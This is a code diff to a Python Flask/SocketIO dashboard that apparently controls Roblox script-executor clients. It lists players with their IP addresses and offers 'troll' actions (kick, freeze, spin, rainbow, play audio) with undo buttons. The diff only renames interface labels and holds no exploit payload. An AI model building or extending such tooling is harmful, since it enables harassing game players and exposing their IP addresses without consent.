@@ -169,14 +169,14 @@ HTML = """<!DOCTYPE html>
     
     <div class="main-layout">
         <section>
-            <h2 style="color: var(--accent); margin-bottom: 25px; font-family: 'Orbitron'; font-size: 1rem; letter-spacing: 2px;">ACTIVE_OPERATIVES</h2>
+            <h2 style="color: var(--accent); margin-bottom: 25px; font-family: 'Orbitron'; font-size: 1rem; letter-spacing: 2px;">Players</h2>
             <div class="grid" id="players"></div>
         </section>
 
         <aside>
             <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 25px;">
-                <h2 style="color: var(--accent); font-family: 'Orbitron'; font-size: 1rem; letter-spacing: 2px;">MISSION_LOGS</h2>
-                <button onclick="clearHistory()" style="background:none; border:none; color: var(--danger); cursor:pointer; font-weight:bold; font-size:0.7rem;">[ PURGE ]</button>
+                <h2 style="color: var(--accent); font-family: 'Orbitron'; font-size: 1rem; letter-spacing: 2px;">Logs</h2>
+                <button onclick="clearHistory()" style="background:none; border:none; color: var(--danger); cursor:pointer; font-weight:bold; font-size:0.7rem;">[ CLEAR ]</button>
             </div>
             <div class="history-panel">
                 <div class="history-list" id="history-list"></div>
@@ -248,11 +248,11 @@ socket.on("update", (data) => {
             
             <div class="info-grid">
                 <div><b>IP:</b> ${p.ip}</div>
-                <div><b>EXEC:</b> ${p.executor}</div>
-                <div style="grid-column: span 2"><b>MISSION:</b> <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank">${p.gameName}</a></div>
+                <div><b>Executor:</b> ${p.executor}</div>
+                <div style="grid-column: span 2"><b>Game:</b> <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank">${p.gameName}</a></div>
             </div>
 
-            <div style="color:var(--accent); font-size:0.7rem; letter-spacing:1px; margin-bottom:10px">ATTACK_MODULES</div>
+            <div style="color:var(--accent); font-size:0.7rem; letter-spacing:1px; margin-bottom:10px">Troll</div>
             <div class="btn-group">
                 <button class="btn btn-troll" onclick="openKickModal('${id}')">KICK</button>
                 <button class="btn btn-troll" onclick="sendTroll('${id}','freeze')">FREEZE</button>
@@ -263,12 +263,12 @@ socket.on("update", (data) => {
                 <button class="btn btn-troll" style="grid-column: span 2; background:orange" onclick="openSoundModal('${id}')">PLAY AUDIO</button>
             </div>
 
-            <div style="color:#555; font-size:0.7rem; letter-spacing:1px; margin:15px 0 10px">RECOVERY_MODULES</div>
+            <div style="color:#555; font-size:0.7rem; letter-spacing:1px; margin:15px 0 10px">UNDO</div>
             <div class="btn-group">
-                <button class="btn btn-undo" onclick="sendTroll('${id}','unfreeze')">DEFROST</button>
-                <button class="btn btn-undo" onclick="sendTroll('${id}','unspin')">STABILIZE</button>
-                <button class="btn btn-undo" onclick="sendTroll('${id}','stopsound')">MUTE</button>
-                <button class="btn btn-undo" onclick="sendTroll('${id}','unrainbow')">RESTORE</button>
+                <button class="btn btn-undo" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
+                <button class="btn btn-undo" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
+                <button class="btn btn-undo" onclick="sendTroll('${id}','stopsound')">STOPSOUND</button>
+                <button class="btn btn-undo" onclick="sendTroll('${id}','unrainbow')">UNRAINBOW</button>
             </div>
         `;
     });
@@ -381,4 +381,5 @@ def broadcast_loop():
 if __name__ == "__main__":
     socketio.start_background_task(broadcast_loop)
     socketio.run(app, host="0.0.0.0", port=5000)
+
 
